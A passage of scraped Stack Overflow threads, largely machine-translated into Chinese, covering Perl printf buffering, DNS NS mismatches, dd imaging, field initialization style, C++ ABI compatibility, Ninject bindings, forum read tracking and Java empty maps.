        if($matched_id){printf $fh "ID #: ".$argid." exists.\n";}
        if($matched_uname){printf $fh "Username: ".$arguname." exists.\n";}
        printf $fh "Aborting."; 
        exit;
    } 
```

EDIT:
Part of the code I copied contained this

```
select $fh; $| = 1; #set auto flush 
```

Maybe this is why my results couldn't be duplicated....

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-03-11T20:02:37.963

I gave [R. Bemrose](https://stackoverflow.com/questions/636083/perl-exits-without-printing-preceding-lines-using-printf/636099#636099) my vote, but if $fh is a **FILE HANDLE** you may want to also `close` it prior to terminating.

Also, you are using `printf` wrongly. printf is **not** 'print file'. its 'print format'.

For that last example

```
 print $fh 'Message' ; 
```

Is all you need.

`printf` is intended to be used thus:

```
printf $fh 'some format %s  and more %s ' ,  $var , $var ; 
```

or

```
 printf 'some format %s  and more %s ' ,  $var , $var ; 
```

and its equivelant to doing

```
 print $fh sprintf 'format %s more %s' , $var , $var ; 
```

And because of this, you're putting needless code risks in in the event any of your concatenated variables expand to have '%' in them. For an example of people falling into this trap, see [Q:308417:Why does my Perl script remove characters from the file?](https://stackoverflow.com/questions/308417/why-does-my-perl-script-remove-characters-from-the-file)

## `perldoc -f print`

```
print FILEHANDLE LIST
print LIST
print   Prints a string or a list of strings.

```

## `perldoc -f printf`

```
printf FILEHANDLE FORMAT, LIST
printf FORMAT, LIST
      Equivalent to "print FILEHANDLE sprintf(FORMAT, LIST)", except that "$\" 
      (the output record separator) is not appended

```

## Further Probing

I've been probing into your problem further because I can't get your "buffering" condition to occur. All my files are properly flushed whether or not I flush them. ( Perl 5.10 ).

Heres my code snippet I'm trying:

```
#!/usr/bin/perl 

use strict;
use warnings;

open my $fh , '>' , '/tmp/oo.txt'; 

my $exit_at = int(rand( 200_000 ));
print "$exit_at\n";
sleep 2;
for ( 0 .. ( $exit_at * 2 ) ){ 
    print $fh $_;
    if ( $_ == $exit_at ){
        printf $fh '%n' ; # Bad Code Causes Early Death. 
        printf $fh 'last line';
        exit; 
    }
    if ( $_ % 1000  ){
        print $fh "\n";
    }
} 
```

I'm using your miss-use of printf. The line that is commented ejects an error message, because its not valid due to nobody providing the 'n' parameter, and it dies with:

```
Modification of a read-only value attempted at iotest.pl line 15. 
```

Before executing 'last line' print ( also bad, but theres no % symbols in it so its fine ) making 'last line' absent from the output file.

Please fix up your printf and use plain-old-print instead and see if that solves your problem.

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-03-11T19:58:32.403

Perl buffers its output. You can turn off autobuffering with

```
local $| = 1; 
```

Edit: I somehow hit ! instead of | the first time... fixed. No idea how that happened, they're on opposite sides of the keyboard.

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-03-11T19:57:26.680

Try "Aborting.\n"

This looks like a buffering issue.

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-03-12T05:09:23.860

On the subject of proper use of `print`, you make things a little hard on yourself.

Interpolate your variables instead of concatenating the strings together. Use one print statement with a list of strings to print, instead of multiple strings.

Here's one way:

```
if( $i>0 && $i<3 )
{
    print $fh join "\n", 
        "Partial match found.",
        $matched_uid   ? "UID #: $arguid exists."      : (),
        $matched_id    ? "ID #: $argid exists."        : (),
        $matched_uname ? "Username: $arguname exists." : (),
        "Aborting.",
        ;

    exit;
} 
```

The `()` on the false side of the ternary operator is an empty list, which will disappear when the arguments to join are flattened. If I had used and empty string (`''`), each non-matching criterion would have produced an extra blank line in the results.

You could also add your own newline on each item, and then skip the join, if you feel this is more readable:

```
 print $fh  
        "Partial match found.\n",
        $matched_uid   ? "UID #: $arguid exists.\n" : '',
        ... 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-11T19:58:07.473

You need to add a trailing \n to the last printf. Otherwise the output doesn't get flushed to the console.

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-11T20:01:31.787

Either David Norman is right, or the problem is somewhere else. I just typed the code inside the if block into the perl interpreter, and it printed "Aborting." as expected. (It worked for me even without the terminating newline character.)

# configuration - DNS：为区域设置的 NS 名称是否必须与上游 TLD 服务器报告的 NS 名称匹配？

> ID：636084
> 
> 赞同：6
> 
> 时间：2009-03-11T19:53:17.847
> 
> 标签：configuration, dns, nameservers

我注意到一些服务提供商正在为其客户的域运行 DNS 服务，其 NS 名称为区域设置并由权威名称服务器返回（在权威部分/NS 和 SOA 记录中）与返回的 NS 名称不匹配由上游服务器（例如 TLD 服务器）并用于查找。

例子：

**$ 挖-域名-here.com NS**

```
; <<>> DiG 9.4.2-P1 <<>> the-domain-name-here.com NS
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7844
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2

;; QUESTION SECTION:
;the-domain-name-here.com.          IN      NS

;; ANSWER SECTION:
the-domain-name-here.com.   172370  IN      NS      ns1.service-provider-here.net.
the-domain-name-here.com.   172370  IN      NS      ns2.service-provider-here.net.

;; ADDITIONAL SECTION:
ns1.service-provider-here.net.      7200    IN      A       192.168.100.1
ns2.service-provider-here.net.      7200    IN      A       192.168.100.2

;; Query time: 65 msec
;; SERVER: 192.168.0.1#53(192.168.0.1)
;; WHEN: Wed Mar 11 19:44:00 2009
;; MSG SIZE  rcvd: 118 
```

**$挖掘@ns1.service-provider-here.net。域名-here.com**

```
; <<>> DiG 9.4.2-P1 <<>> @ns1.service-provider-here.net  the-domain-name-here.com
; (1 server found)
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48010
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;the-domain-name-here.com.          IN      A

;; ANSWER SECTION:
the-domain-name-here.com.   86400   IN      A       192.168.100.3

;; AUTHORITY SECTION:
the-domain-name-here.com.   86400   IN      NS      ns1.different-trade-name.net.
the-domain-name-here.com.   86400   IN      NS      ns2.different-trade-name.net.

;; Query time: 68 msec
;; SERVER: 192.168.100.1#53(192.168.100.1)
;; WHEN: Wed Mar 11 19:46:00 2009
;; MSG SIZE  rcvd: 100 
```

gTLD 服务器说名称服务器是 ns1.service-provider-here.net，当我们在该服务器上查找名称时，它会给出权威答案，但会在权限部分泄漏不同的 NS 名称 (ns1.different-trade-name 。网）。

以这种方式配置的域有数千个。它似乎没有引起任何问题，但它似乎是错误的。

这真的重要吗？是否会出现解析器/客户端会因此进行额外查找甚至无法解析名称的情况？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-12T10:56:24.040

嗯，答案取决于观点。

从技术上讲，毫无疑问，父区域和区域之间的任何差异都是错误的。它不应该发生（一些注册中心使用自动工具来检查，例如[Zonecheck](http://www.zonecheck.fr/) in `.fr`）。

实际上，它经常发生。最常见的原因是人们更改了他们区域中的 NS 记录，而忘记告诉注册表（或注册商，如果注册表强迫您通过中间人）有关更改。

真的有关系吗？好吧，正如您所说，只要两组之间存在非空交集，它就应该起作用。但是依赖它是危险的，因为再改变一次，两组可能会完全分开。因此，接受差异不是一个好主意。

从法律上讲，child zone 永远是对的，parent 中的 NS 记录不具有权威性。解析器必须用他们在子区域中找到的列表替换委托。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T21:10:50.717

如果父级具有引用对该区域具有权威性的 DNS 服务器的有效记录，则解析应该主要工作。

我至少可以想到一种情况，如果您有不同的记录和其他一些错误配置，它们可能会成为问题。

该问题与名称服务器如何在区域更新时发出通知有关。例如，当您在主 dns 服务器上使用 bind 时，更新区域然后重新加载，bind 将向区域中列出的所有服务器发送更新通知。如果他们是另一台权威服务器，在主区域中没有 NS 记录，那么它不会收到通知，并且会有较旧的数据。如果父母指向未获得更新的该服务器，那么您可能会遇到问题，因为该服务器将提供数据不足的结果。

另外，请记住，存在“水平分割”DNS 这样的东西。有时，您需要为网络内部的内部主机提供不同的区域视图，而不是向公众显示的视图。当您比较名称服务器记录时，请确保您从同一角度查看区域。

# visual-studio - Visual Studio 不会生成调试 DLL

> ID：636085
> 
> 赞同：1
> 
> 时间：2009-03-11T19:54:02.553
> 
> 标签：visual-studio, debugging, dll, configuration, linker

当我为配置选择“调试”时，Visual Studio 不会生成调试 DLL。

相反，它制作了一个发布版本。输出窗口显示它正在制作发布版本，即使选择了调试配置。它生成的发布 DLL 具有当前日期。

当我将项目保存在 Debug 配置中并重新加载时，它神奇地切换到了 Release 配置。

该项目已经运行了几个月，而这个问题今天才开始发生。

发生了什么事，我怎样才能让它产生一个调试 DLL？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T19:56:11.427

您的项目构建配置可能设置为“调试”解决方案配置的“发布”。打开配置管理器（右键单击解决方案，单击“配置管理器...”）。选择“调试”作为活动解决方案配置，并确保列表中的所有项目都选择了“调试”作为其配置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T19:56:08.197

在解决方案资源管理器中右键单击解决方案，选择属性，然后单击配置，确保调试配置已将每个子项目设置为调试。

# .net - wtsapi32.WTSQuerySessionInformation() 在 x64 上失败

> ID：636098
> 
> 赞同：1
> 
> 时间：2009-03-11T19:58:11.000
> 
> 标签：.net, winapi, terminal-services

我正在尝试在 64 位 Windows 机器上收集终端服务器会话信息。我的问题是两方面的。首先，在 32 位机器上，我们调用了以下函数，它运行良好。

```
Private Declare Function WTSQuerySessionInformation Lib "wtsapi32" _
                  Alias "WTSQuerySessionInformationA" _
                 (ByVal hServer As Integer, _
                  ByVal SessionID As Integer, _
                  ByVal WTSInfoClass As Integer, _
                  ByRef ppBuffer As String, _
                  ByRef lLen As Integer) As Integer 
```

然而，在 64 位机器上，此函数调用失败。有谁知道如何解决这个问题？我四处搜索，但找不到太多关于在 64 位机器上调用此函数的信息。其次，有没有人知道获取 TS 客户端会话信息的任何其他选项？具体来说，我需要访问 TS 的计算机名称。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-09T02:34:35.833

在 64 位机器上调用失败的具体情况如何？我的猜测是，这与您调用函数的 ANSI 版本有关。也许您对 Unicode 版本 (WTSQuerySessionInformationW) 有更好的运气。

但是要回答您的第二个问题，您可以尝试使用[Cassia](http://cassia.googlecode.com/)，这样您就不必处理 P/Invokes：

```
New Cassia.TerminalServicesManager().CurrentSession.ClientName 
```

我不记得我之前是否在 64 位机器上尝试过它，但如果它有效，它可能会让你的事情变得更容易一些。

编辑：刚刚在 64 位 Windows Server 2008 R2 beta 机器上测试了 Cassia，它运行良好。

# linux - DD img 不同的 MD5 的？

> ID：636100
> 
> 赞同：4
> 
> 时间：2009-03-11T19:59:04.993
> 
> 标签：linux, dd, ext2

我们有一个智能媒体卡，上面安装了 linux，我们需要复制它。我们使用 DD 创建了一个 img，然后使用 dd 将 img 写回几个新的智能媒体卡。我们比较了原始副本和新副本的 MD5 校验和，它们是不同的。

这是我们使用的：

dd if=/dev/sdb of=myimage.img

dd if=myimage.img of=/dev/sdb

dd if=/dev/sdb of=newimage.img

任何人都知道为什么这些结果不同？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T20:09:22.080

如果卡片尺寸不同，将较小的图像添加到较大的卡片不会“填满”，并且零将保留在卡片的末尾。使用此卡制作的图像将与原始图像不同。

数据也总是有可能在传输过程中被误写、误读或以其他方式损坏。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T20:05:19.110

卡容量不一样？运行 'ls -l myimage.img newimage.img' 可能会告诉你一些信息。运行 'cmp -l myimage.img newimage.img' 可能会告诉你一些信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T20:34:09.777

If you mounted /dev/sdb in between it would be an answer. If I remember correctly ext2 and ext3 have a "mount counter".

# language-agnostic - 我应该总是/永远/从不将对象字段初始化为默认值吗？

> ID：636102
> 
> 赞同：33
> 
> 时间：2009-03-11T19:59:52.447
> 
> 标签：language-agnostic, coding-style

代码样式问题在这里。

我查看了[这个](https://stackoverflow.com/questions/268393/initializing-field-by-default-value-is-redundent)问题，它询问 .NET CLR 是否真的总是会初始化字段值。（答案是*肯定*的。）但令我震惊的是，我不确定让它这样做总是一个好主意。我的想法是，如果我看到这样的声明：

```
int myBlorgleCount = 0; 
```

我有一个很好的想法，程序员希望计数从零开始，并且可以接受，至少在不久的将来。另一方面，如果我只看到：

```
int myBlorgleCount; 
```

我不知道 0 是否是合法或合理的值。如果程序员只是开始阅读和修改它，我不知道程序员是否打算在为其设置值之前开始使用它，或者他们是否期望它为零等。

另一方面，一些相当聪明的人和 Visual Studio 代码清理实用程序告诉我删除这些多余的声明。对此的普遍共识是什么？（有共识吗？）

我将其标记为与语言无关，但如果有一个奇怪的案例，特别是反对特定语言的谷物是一个好主意，那可能值得指出。

**编辑**：虽然我确实提出这个问题与语言无关，但它显然不适用于像 C 这样的语言，其中没有进行值初始化。

**编辑**：我很欣赏约翰的回答，但这正是我**不**想要的。我了解 .NET（或 Java 或其他）将完成这项工作并一致且正确地初始化值。我要说的是，如果我看到代码正在修改以前没有在代码中明确设置的值，我作为代码维护者，不知道原始编码器是否意味着它是默认值，或者只是忘记设置值，或者期望将其设置在其他地方，等等。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-03-11T20:32:18.267

考虑长期维护。

*   保持代码尽可能明确。
*   如果不需要，不要依赖语言特定的初始化方式。也许新版本的语言会以不同的方式工作？
*   未来的程序员会感谢你。
*   管理层会感谢你的。
*   为什么要混淆事物，哪怕是最轻微的？

**更新：**未来的维护者可能来自不同的背景。这真的不是关于什么是“正确的”，而是从长远来看最容易的事情。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-03-11T20:05:01.420

假设平台按照平台的工作方式运行，您始终是安全的。.NET 平台将所有字段初始化为默认值。如果你看到一个没有被代码初始化的字段，这意味着这个字段是被 CLR 初始化的，而不是它没有被初始化。

这个问题对于不保证初始化的平台是有效的，但不是在这里。在 .NET 中，更多地表明开发人员的无知，认为初始化是必要的。

* * *

过去的另一个不必要的宿醉如下：

```
string foo = null;
foo = MethodCall(); 
```

我从应该更了解的人那里看到了这一点。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-11T20:04:31.500

我认为，如果它阐明了开发人员的意图，那么初始化这些值是有意义的。

在 C# 中，没有任何开销，因为值都已初始化。在 C/C++ 中，未初始化的值将包含垃圾/未知值（内存位置中的任何内容），因此初始化更为重要。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-03-11T20:12:53.507

如果它真的有助于使代码更易于理解，我认为应该这样做。

但我认为这是所有语言功能的普遍问题。我对此的看法是：**如果它是语言的官方特性，你可以使用它。**（当然有一些反特性应该谨慎使用或完全避免，比如`option explicit`Visual Basic 中的缺失或 C++ 中的菱形继承）

有段时间我非常偏执，添加了各种不必要的初始化、显式强制转换、超偏执的 try-finally 块……我什至想过忽略自动装箱并用显式类型转换替换所有出现的情况，只是“为了安全起见”。

**问题是：没有尽头。**您可以避免几乎所有语言功能，因为您不想信任它们。

记住：在你理解之前，这只是魔法:)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-11T20:03:48.240

我同意你的看法; 它可能很冗长，但我喜欢看到：

```
int myBlorgleCount = 0; 
```

现在，我总是初始化字符串：

```
string myString = string.Empty; 
```

（我只是讨厌空字符串。）

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-11T20:23:46.617

在我无法立即将其设置为有用的情况下

```
int myValue = SomeMethod(); 
```

我将它设置为 0。这更多是为了避免不得不考虑其他情况下的值。对我来说，整数总是设置为 0 的事实不在我的指尖，所以当我看到

```
int myValue; 
```

我需要花一点时间来回忆起这个事实并记住它将被设置为什么，从而打乱了我的思维过程。对于那些拥有这些知识的人来说，他们会遇到

```
int myValue = 0; 
```

并且想知道为什么那个人将它设置为零，而编译器只会为他们做这件事。这个想法会打断他们的思考过程。

所以做对你和你所在的团队最有意义的事情。如果通常的做法是设置它，那么就设置它，否则不要。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-07-28T16:01:22.243

根据我的经验，我发现显式初始化局部变量（在 .NET 中）比清晰度更混乱。

另一方面，应始终初始化类范围的变量。过去，我们为常见变量类型定义了系统范围的自定义“null”值。这样我们总是可以知道什么是错误未初始化的，什么是故意初始化的。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-12-21T12:38:55.293

我总是在构造函数中显式地初始化字段。对我来说，这是做这件事的地方。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-11T20:03:38.383

我认为很多都归结为过去的经历。

在旧的和未管理的语言中，期望值是未知的。来自这些语言的程序员保留了这种期望。

几乎所有现代或托管语言都为最近创建的变量定义了值，无论是来自类构造函数还是语言特性。

现在，我认为初始化一个值是非常好的；曾经隐含的东西变成了明确的。从长远来看，比如说，在接下来的 10 到 20 年内，人们可能会开始了解到默认值是可能的、预期的和已知的——尤其是如果它们在不同语言之间保持一致（例如，空字符串表示字符串，0 表示数字） .

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-03-11T20:07:28.077

你应该这样做，没有必要，但如果你这样做会更好，因为你永远不知道你使用的语言是否初始化了这些值。通过自己做，您可以确保您的值已初始化并设置了标准的预定义值。这样做并没有错，除了可能有点“浪费时间”。我强烈推荐它。虽然 John 的推荐信息量很大，但在一般用途上，最好走安全的道路。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-03-11T20:11:44.587

我通常对字符串进行此操作，在某些情况下，我不希望空值四处飘荡。我工作的普遍共识是“不要为值类型明确地这样做”。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-03-11T20:12:30.390

我不会这样做的。C# 无论如何都会将 int 初始化为零，因此这两行在功能上是等效的。一个只是更长且多余，尽管对于不了解 C# 的程序员来说更具描述性。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-03-11T20:18:21.467

这被标记为与语言无关，但大多数答案都与 C# 有关。

在 C 和 C++ 中，最佳实践是**始终**初始化您的值。在某些情况下，这会为您完成，例如静态全局变量，但对于大多数编译器冗余初始化这些值不应该有任何形式的性能损失。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-03-11T20:22:03.907

我不会初始化它们。如果您使声明尽可能接近第一次使用，那么就不应该有任何混淆。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-05-10T01:53:32.857

要记住的另一件事是，如果要使用自动属性，则必须依赖隐式值，例如：

```
public int Count { get; set; } 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-07-28T15:52:17.423

[http://www.geekherocomic.com/2009/07/27/common-pitfalls-initialize-your-variables/](http://www.geekherocomic.com/2009/07/27/common-pitfalls-initialize-your-variables/)

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2015-05-15T23:27:51.997

如果一个字段通常会在其中存储新值而不考虑之前的内容，并且如果它的行为就像最初存储在那里但没有关于零的“特殊”一样，那么应该显式存储该值。

如果该字段表示一个计数或总计，它永远不会直接写入非零值，而是总是添加或减去其他数量，那么零应该被视为“空”值，因此不需要显式表示。

使用粗略的类比，请考虑以下两个条件：

1.  `如果 (xposition != 0) ...
2.  `if ((flags & WoozleModes.deluxe) != 0) ...

在前一种情况下，与文字零进行比较是有意义的，因为它正在检查一个在语义上与任何其他位置没有区别的位置。然而，在第二种情况下，我建议与文字零的比较不会增加可读性，因为代码并不关心表达式的值是否`(flags & WoozleModes.deluxe)`恰好是零以外的数字，而是它是否“非-空的”。

我不知道有任何编程语言提供不同的方式来区分“零”和“空”的数值，除了在指示空时不需要使用文字零。

# c++ - 在 d 指针类中添加新成员函数会破坏二进制兼容性吗？

> ID：636110
> 
> 赞同：5
> 
> 时间：2009-03-11T20:02:36.823
> 
> 标签：c++, api-design, binary-compatibility, d-pointer

将新成员函数添加到 d 指针类定义中会破坏二进制兼容性吗？

例如，与原始定义相比，下面的新定义会破坏二进制兼容性吗？（附带问题，是否有工具可以告诉我新的 .so 与旧的 .so 相比是否会破坏二进制兼容性？如果没有，我该如何手动检查？）

原来的：

```
#ifndef __TESTBC_H__
#define __TESTBC_H__
class APrivate;

class A
{
  public:
   int get() { d->update(); return _d->get(); }

private:
   APrivate *_d;

};

class APrivate
{
  public:
   int get() { return _val; }
   void update() { _val = 1; }

  private:
   int _val;
};
#endif 
```

新的：

```
#ifndef __TESTBC_H__
#define __TESTBC_H__
class APrivate;

class A
{
  public:
   int get() { _d->update(); return _d->get(); }

private:
   APrivate *_d;

};

class APrivate
{
  public:
   int get() { return _val; }
   void update() { _val = 1; multiply(); }
   void multiply() { _val = _val * 10; }

  private:
   int _val;
};
#endif 
```

仅供参考：我知道 d 指针类应该在 cc 文件而不是标题中指定。上面的示例旨在关注二进制兼容性问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-11T20:23:56.523

不，不是的。

您应该了解 C++ 如何构建其对象。

在您的情况下，它几乎是具有非虚拟成员函数的“POD”类。这些函数不影响对象在内存中的表示。因此，新版本与旧版本二进制兼容。

更重要的是，如果您不向用户公开您的“Aprivate”类。（没有给出标题只是前向声明），即使您进行了更大的更改，您也不会破坏 API。

意义：

```
#ifndef YOUR_PUBLIC_API
#define YOUR_PUBLIC_API
class bar;
class foo {
public:
    // member functions using bar
private:
    bar *bar_;
};
#endif 
```

你甚至不暴露`bar`，所以你可以以任何你想要的方式改变它。这是使 C++ 库 ABI 兼容的最佳方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-08-07T20:53:52.893

考虑使用[abi-compliance-checker](http://lvc.github.io/abi-compliance-checker/)工具，它检查头文件和共享库并搜索可能破坏二进制兼容性的 ABI 更改。

# c# - Ninject，多个服务绑定

> ID：636114
> 
> 赞同：4
> 
> 时间：2009-03-11T20:03:17.290
> 
> 标签：c#, inversion-of-control, ninject

我正在使用 Ninject 加载几个模块。当两个模块尝试为一个接口绑定两个不同的实现时，ninject 会引发一个错误，即不允许对一个服务进行多个绑定。

我正在使用的所有其他 IoC 框架（Unity、Windsor、Spring.net 等）都能够为一个接口“注册”多个实现。

让我举一个现实生活中的例子：

```
public class HealtMonitorEmailAlertServiceModule : StandardModule
{
    public override void Load()
    {
        this.Bind<IAlertService>().To<EmailAlertService>();
    }
}

public class HealtMonitorSmsAlertServiceModule : StandardModule
{
    public override void Load()
    {
        this.Bind<IAlertService>().To<SmsAlertService>();
    }
}

public class Program
{
    static void Main()
    {
        var emailService = new HealtMonitorEmailAlertServiceModule();
        var smsService = new HealtMonitorSmsAlertServiceModule();

        IKernel kernel = new StandardKernel(emailService, smsService);  
        kernel.Get<IAlertService>()
    }
} 
```

上面会产生一个异常，我希望它能够解析在最后一个模块中注册的类型以加载到内核中。我已经使用 Autofac 尝试了完全相同的方法，它按我的预期工作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-05T18:20:35.810

Ninject 2.0 具有此功能，但 Ninject 1.x 没有。虽然 2.0 仍处于测试阶段，但我鼓励您看一看，因为 1.x 将在几个月内结束生命周期。

# forum - 网络论坛上的“标记为已读”系统如何工作？

> ID：636115
> 
> 赞同：2
> 
> 时间：2009-03-11T20:03:17.680
> 
> 标签：forum

我想知道这个已经有一段时间了。我想知道网络论坛实现了突出显示您尚未阅读的内容的选项。论坛怎么知道。

由于大多数网络论坛都具有向您显示自您上次访问以来的所有帖子的功能，因此它们必须将您上次访问其中一个页面的时间保存在数据库中的用户数据中。

但这并不能解释在您只阅读了一个主题之后如何仍然突出显示各个主题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T20:07:09.980

一个多对多表将用户连接到一个主题/帖子，带有阅读/收藏等标志。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T20:07:22.070

许多网络论坛存储了您上次查看每个主题的巨大列表。

这很快就会失控，但有一些缓解措施。请参阅[确定论坛中的未读项目](https://stackoverflow.com/questions/514232/determining-unread-items-in-a-forum/514302#514302)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T20:16:36.963

通常，此“未读”项目列表仅显示自您上次注销以来所做的更改。

使用用户的上次活动日期/时间将项目标记为“未读”（该时间之后主题中的任何活动都标记为“未读”）。然后将用户自上次登录后查看的主题 ID 列表存储在 Session 变量中。将这两者结合起来会给你一个相对准确的未读主题列表。

当然，这些数据会在注销或会话到期时丢失，并且循环将重新开始，而不会牺牲不必要的 SQL 查询量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T20:50:25.150

在我曾经使用过的自定义论坛上，我们使用了您上次访问时间（每次查看另一个页面时更新 - 通常是 cookie）和每个主题上的“标记已读”按钮，该按钮添加了日期/时间值包含您的用户 ID、主题 ID 和日期/时间的 SQL 表。

因此，要查看新主题，我们会查看您的上次访问日期，并且在该时间点之后创建的任何内容都是新主题。

输入主题后，您单击“标记为已读”的任何主题只会显示初始主题，然后在单击标记为已读按钮后添加日期/时间的任何回复。如果您的观众和性能较少，您基本上可以将其设置为在用户单击的每个主题时向表中添加一个条目，当他们单击它时。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-12T00:25:28.690

跟踪访问者阅读了哪些帖子当然不是什么大不了的事。因为访问者阅读的帖子数量很可能远少于未阅读的帖子数量。因此，如果您知道访问者阅读了哪些帖子，那么您也知道该访问者没有阅读哪些帖子。为了减少计算密集度，您通常只在特定时间段内执行此操作，例如过去两周。在此之前的所有内容都将被视为已读。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-12T00:45:22.993

您拥有的另一个选项，我实际上已经在 vBulletin 安装中看到过此操作，是在 cookie 中存储以逗号分隔的客户端查看主题 ID 列表。

服务器端，唯一存储的是用户上次访问的时间。论坛系统将此与用户 cookie 中的信息结合使用，以显示任何主题的“已读”，其中

*   上次修改日期（即上次发布）早于用户上次访问
*   在用户的 cookie 中找到的主题 ID，作为用户访问此会话的主题。

我并不是说这是一个*好主意*，但我想我会提到它作为替代方案 - 其他答案中已经说明了这样做的明显方法，即将它存储在服务器端作为关系表（多对多桌子）。

我想它确实具有减少保存该信息的服务器负担的优势。

缺点是它与会话相关联，因此一旦开始新会话，在最后一个会话之前发生的所有内容都被视为“已读”。另一个缺点是 cookie 只能保存这么多信息，而用户在一个会话中可能会查看数百个主题，因此它接近 cookie 的存储限制。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-12T00:51:14.713

另一种方法：

*   确保您的样式表显示访问和未访问链接之间的明显区别，利用浏览器持久记住访问页面的事实。

但是，要使其工作，您需要有一致的主题 URL，而大多数论坛系统并不倾向于这样做。另一个缺点是用户可能会清除他们的历史记录，或使用多个浏览器。因此，这将这项措施归入“不高度可靠的类别”；您可能会这样做以增加您用于跟踪查看主题的任何其他措施。

# communication - 保持应用程序和基础设施连接

> ID：636123
> 
> 赞同：2
> 
> 时间：2009-03-11T20:05:13.370
> 
> 标签：communication, status, infrastructure

我在一个分为两组的 IT 部门工作。一组开发和管理应用程序，另一组管理公司的基础设施和服务器。我们面临的问题之一是沟通中断。我为应用程序组工作，我遇到的问题之一是当服务器被基础设施关闭或正在刷新数据库时没有收到通知。

有没有人对如何改善两组之间的通信有任何建议，或者对如何在多个系统（Linux 和 Windows）之间保持轻量级日志有任何想法？理想情况下，如果我们可以让我们的盒子只是推特他们的状态或其他东西，那就太好了。

谢谢您的帮助，

本

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T20:15:40.380

要传达服务器状态，您可以做的一件事是让我们的基础设施组设置一个像[Nagios](http://www.nagios.org/)这样的网络监控系统。这将使您的应用程序组中的每个人都能够获得系统中每个服务器状态的快照视图。当您进行开发时，拥有这种状态是非常宝贵的。

Nagios 为您提供网络监控，但也允许您显示系统中特定服务器的计划停机时间。

你的团队可以做的另一件事是促进与基础设施的沟通，让你的构建系统报告它当前正在使用哪些服务器来构建和测试你的产品。

此外，在两个群体的利益相关者之间建立定期会议可能也是一个好主意。如果你们都在互相交谈，即使每周 15 分钟，您可能会看到像您上面描述的那样的事件会减少很多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T20:51:49.500

我认为这是变更控制的一个更大问题。

您应该拥有硬件和软件变更控制以及批准流程。

最终，基础设施为您服务——IT 基础设施的目的是运行应用程序。

在我目前的大型财务数据公司中，未经客户端和应用程序组的适当授权，服务器不会被触摸。这似乎是一个巨大的痛苦，但每台服务器的存在都是有原因的——满足特定的业务目标并运行特定的应用程序。基础设施团队根本没有任何借口可以随意改变事物或扰乱服务器。

对关键硬件故障的响应可能是一个例外。

所需的软件和操作系统更新通过计划的维护窗口和批准的更改流程进行处理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T20:20:29.183

我也喜欢 Nagios 的想法。如果您想设置更多的通信工具，我会推荐像 Drupal 这样的内容管理系统。

我们在内部使用 Drupal 在团队之间进行交流。当一个团队关闭服务器时，他们会在 Drupal 中添加一个事件。我们其他人要么将其作为电子邮件、RSS 项目获取，要么仅通过刷新页面来获取。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T20:41:02.643

实施变更控制流程，为**两个**组提交、批准和安排变更。这让每个人都知道发生了什么。这个过程可以是轻量级的，也可以是重量级的。

# java - 在 Java 中创建空地图的最佳方法

> ID：636126
> 
> 赞同：142
> 
> 时间：2009-03-11T20:05:40.640
> 
> 标签：java, dictionary, collections, hashmap

我需要创建一个空地图。

```
if (fileParameters == null)
    fileParameters = (HashMap<String, String>) Collections.EMPTY_MAP; 
```

问题是上面的代码产生了这个警告： **Type safety: Unchecked cast from Map to HashMap**

创建这个空地图的最佳方法是什么？

* * *

## 回答 #1

> 赞同：284
> 
> 时间：2009-03-11T20:10:49.347

**1）**如果地图可以是不可变的：

```
Collections.emptyMap()

// or, in some cases:
